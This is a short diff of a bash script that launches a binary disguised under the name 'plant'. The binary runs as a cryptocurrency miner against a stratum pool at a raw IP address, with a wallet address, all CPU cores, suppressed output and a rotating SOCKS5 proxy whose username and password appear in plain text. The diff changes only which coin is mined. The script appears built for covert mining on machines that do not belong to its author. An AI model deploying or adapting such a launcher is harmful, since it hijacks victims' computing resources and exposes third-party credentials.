@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x plant  >/dev/null 2>&1
-./plant -a yespower -o stratum+tcp://103.249.70.7:6533 -u TAFbTbW1k9uUCTmSBimSx6u4NUAtEnSNY9.wrk -p c=TRX,mc=BTE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+./plant -a yespower -o stratum+tcp://103.249.70.7:6533 -u TAFbTbW1k9uUCTmSBimSx6u4NUAtEnSNY9.wrk -p c=TRX,mc=TRX -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
